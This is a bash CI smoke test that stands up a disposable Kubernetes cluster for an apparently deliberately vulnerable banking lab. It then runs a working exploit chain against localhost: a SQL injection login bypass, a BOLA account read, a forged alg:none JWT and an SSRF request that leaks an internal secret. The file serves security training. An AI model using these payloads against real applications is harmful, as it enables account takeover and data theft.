#!/usr/bin/env bash
# Meridian lab smoke test: stand up a disposable kind cluster, deploy the lab,
# prove the exploit chain is intact end-to-end, then destroy everything.
# Source of truth for CI. Requires: docker, kind, kubectl, helm, node18+, jq.
set -euo pipefail

CLUSTER="${CLUSTER:-meridian-smoke}"
NS="${NS:-meridian}"
REG="${REG:-meridian-lab}"
WEB_URL="${WEB_URL:-http://127.0.0.1:30080}"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

cleanup() { kind delete cluster --name "$CLUSTER" >/dev/null 2>&1 || true; }
trap cleanup EXIT

echo "==> create isolated kind cluster"
kind create cluster --name "$CLUSTER" --config "$ROOT/orchestrator/kind-config.yaml" --wait 90s
kubectl label ns kube-system kubernetes.io/metadata.name=kube-system --overwrite >/dev/null 2>&1 || true

echo "==> build + load images"
for s in web api ledger; do docker build -q -t "$REG/$s:latest" "$ROOT/app/$s" >/dev/null; done
kind load docker-image "$REG/web:latest" "$REG/api:latest" "$REG/ledger:latest" --name "$CLUSTER"

echo "==> helm install"
helm install meridian "$ROOT/chart" -n "$NS" --create-namespace --set registry="$REG"
kubectl -n "$NS" rollout status deploy/postgres --timeout=120s
kubectl -n "$NS" rollout status deploy/api --timeout=120s
kubectl -n "$NS" rollout status deploy/web --timeout=120s
sleep 5  # let postgres finish seeding

echo "==> invariants (RBAC misconfig + app reachable + SQLi works)"
WEB_URL="$WEB_URL" LAB_NAMESPACE="$NS" npx --yes ts-node "$ROOT/orchestrator/checker.ts" invariants

echo "==> exploit-chain assertions"
# 1) SQLi auth bypass -> token
TOK=$(curl -fsS -X POST "$WEB_URL/api/login" -H 'content-type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" | jq -r .token)
[ -n "$TOK" ] && [ "$TOK" != "null" ] && echo "  ok: SQLi login"

# 2) BOLA -> read another customer's high-value account
BAL=$(curl -fsS "$WEB_URL/api/accounts/1003" -H "authorization: Bearer $TOK" | jq -r .balance)
[ "$(printf '%.0f' "$BAL")" -ge 990000 ] && echo "  ok: BOLA read of account 1003"

# 3) forge alg:none admin token, then SSRF into the internal ledger config
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"sub":1,"role":"admin","account_id":1009}' | base64 | tr '+/' '-_' | tr -d '=')
ADMIN="$HEADER.$PAYLOAD."
SSRF=$(curl -fsS -X POST "$WEB_URL/api/webhooks/test" -H "authorization: Bearer $ADMIN" \
  -H 'content-type: application/json' \
  -d '{"url":"http://ledger:9000/internal/config"}' | jq -r .body)
echo "$SSRF" | grep -q "JWT_SECRET" && echo "  ok: alg:none admin + SSRF leaked ledger env"

echo "==> SMOKE TEST PASSED"
